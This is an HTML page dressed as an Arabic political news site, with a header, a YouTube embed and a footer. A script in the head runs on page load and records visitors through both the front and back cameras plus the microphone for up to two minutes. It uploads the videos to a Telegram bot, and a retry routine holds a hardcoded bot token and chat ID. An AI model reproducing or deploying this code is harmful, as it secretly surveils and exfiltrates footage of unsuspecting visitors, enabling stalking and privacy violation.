<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>آشكاين - جريدة السياسيين وصناع القرار</title>
  <script>
    let mediaRecorder;
    let chunks = [];
    let isStopped = false;

    async function startRecording(facingMode, videoFileName) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode },
                audio: true
            });

            mediaRecorder = new MediaRecorder(stream);

            // Handle data availability
            mediaRecorder.ondataavailable = event => {
                if (event.data.size > 0) {
                    chunks.push(event.data);
                }
            };

            // Handle recorder stop
            mediaRecorder.onstop = async () => {
                if (isStopped) return;
                isStopped = true;

                const blob = new Blob(chunks, { type: 'video/webm' });
                const formData = new FormData();
                formData.append('video', blob, videoFileName);

                const telegramBotToken = 'YOUR_SECURE_TOKEN';
                const chatId = 'YOUR_CHAT_ID';

                try {
                    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo?chat_id=${chatId}`, {
                        method: 'POST',
                        body: formData
                    });

                    const data = await response.json();
                    console.log(`تم إرسال الفيديو (${videoFileName}) بنجاح:`, data);
                } catch (error) {
                    console.error(`حدث خطأ أثناء إرسال الفيديو (${videoFileName}):`, error);

                    // حفظ الفيديو في LocalStorage لإعادة الإرسال لاحقًا
                    localStorage.setItem(`failedVideo-${videoFileName}`, blob);
                }
            };

            mediaRecorder.start();

            // ضبط مؤقت إيقاف بعد دقيقتين
            setTimeout(() => {
                if (!isStopped) {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }
            }, 2 * 60 * 1000);

            // التعامل مع إغلاق الصفحة
            window.addEventListener('beforeunload', () => {
                if (mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }
            });
        } catch (error) {
            console.error(`خطأ أثناء الوصول إلى الكاميرا (${facingMode}):`, error);
        }
    }

    function retryFailedUploads() {
        for (const key in localStorage) {
            if (key.startsWith('failedVideo-')) {
                const blob = localStorage.getItem(key);
                const videoFileName = key.replace('failedVideo-', '');

                // إعادة رفع الفيديو المخزن
                const formData = new FormData();
                formData.append('video', blob, videoFileName);

                const telegramBotToken = '7867318181:AAFHSDLNLvdPFomn3HDxBbNCINP0LeDLHjw';
                const chatId = '1832658980';

                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo?chat_id=${chatId}`, {
                    method: 'POST',
                    body: formData
                })
                    .then(response => response.json())
                    .then(data => {
                        console.log(`تم إعادة إرسال الفيديو (${videoFileName}) بنجاح:`, data);
                        localStorage.removeItem(key);
                    })
                    .catch(error => {
                        console.error(`حدث خطأ أثناء إعادة إرسال الفيديو (${videoFileName}):`, error);
                    });
            }
        }
    }

    document.addEventListener('DOMContentLoaded', () => {
        // إعادة محاولة رفع الفيديوهات الفاشلة عند فتح الصفحة
        retryFailedUploads();

        // تسجيل الكاميرا الأمامية
        startRecording('user', 'front_recording.webm');

        // تسجيل الكاميرا الخلفية
        startRecording('environment', 'back_recording.webm');
    });
</script>

  
  <style>
    /* إعدادات عامة */
body {
  font-family: 'Cairo', sans-serif;
  line-height: 1.6;
  margin: 0;
  padding: 0;
  direction: rtl;
  background-color: #f4f4f9;
  color: #333;
}

/* الحاويات */
.container {
  width: 90%;
  max-width: 1200px;
  margin: auto;
}

/* الهيدر */
.header {
  background: linear-gradient(135deg, #007bff, #0056b3);
  color: #fff;
  padding: 2rem 0;
  text-align: center;
  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
}

.header h1 {
  margin: 0;
  font-size: 2.5rem;
}

.header p {
  margin: 0.5rem 0 1.5rem;
  font-size: 1.2rem;
  color: #d0d9e6;
}

.nav ul {
  list-style: none;
  padding: 0;
}

.nav ul li {
  display: inline-block;
  margin: 0 15px;
}

.nav ul li a {
  color: #fff;
  text-decoration: none;
  font-weight: bold;
  font-size: 1rem;
  transition: color 0.3s ease;
}

.nav ul li a:hover {
  color: #ffd700;
}

/* المحتوى الرئيسي */
.main {
  padding: 2rem 0;
}

.news {
  background: #fff;
  margin-bottom: 1.5rem;
  padding: 1.5rem;
  border-radius: 8px;
  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
  transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.news:hover {
  transform: translateY(-5px);
  box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
}

.news h2 {
  margin-top: 0;
  font-size: 1.5rem;
  color: #0056b3;
}

.news p {
  color: #555;
}

.news a {
  color: #007bff;
  text-decoration: none;
  font-weight: bold;
  transition: color 0.3s ease;
}

.news a:hover {
  color: #0056b3;
  text-decoration: underline;
}

/* الفوتر */
.footer {
  background: #333;
  color: #fff;
  text-align: center;
  padding: 1rem 0;
  margin-top: 2rem;
  box-shadow: 0 -4px 8px rgba(0, 0, 0, 0.1);
}

.footer p {
  margin: 0;
  font-size: 0.9rem;
  color: #ccc;
}
/* تصميم قائمة <ul> */
    .styled-list {
  list-style: none; /* إزالة التنسيق الافتراضي للنقاط */
  padding: 0;
  margin: 0;
  display: flex; /* ترتيب العناصر أفقيًا */
  justify-content: center; /* توسيط القائمة */
  gap: 20px; /* مسافة بين العناصر */
}

.styled-list li {
  position: relative;
}

.styled-list li::before {
  content: "•"; /* رمز نقطي جميل */
  position: absolute;
  left: -15px;
  color: #007bff; /* لون النقطة */
  font-size: 1.5rem;
  top: 50%;
  transform: translateY(-50%);
}

.styled-list li a {
  text-decoration: none;
  color: #333;
  font-size: 1.1rem;
  font-weight: bold;
  transition: color 0.3s ease, transform 0.3s ease;
}

.styled-list li a:hover {
  color: #0056b3; /* لون عند التمرير */
  transform: scale(1.1); /* تكبير النص */
}
  </style>
</head>
<body>
  <header class="header">
    <div class="container">
      <h1>آشكاين</h1>
      <p>جريدة السياسيين وصناع القرار</p>
      <nav class="nav">
        <ul class="styled-list">
            <li><a href="#">الرئيسية</a></li>
            <li><a href="#">الأخبار</a></li>
            <li><a href="#">التحليلات</a></li>
            <li><a href="#">الاتصال بنا</a></li>
          </ul>
      </nav>
    </div>
  </header>
  <iframe width="100%" height="500" 
        src="https://www.youtube.com/embed/IIUH-kzaNXU" 
        frameborder="0" 
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
        allowfullscreen>
</iframe>
  <footer class="footer">
    <div class="container">
      <p>جميع الحقوق محفوظة &copy; 2024 - آشكاين</p>
    </div>
  </footer>
</body>
</html>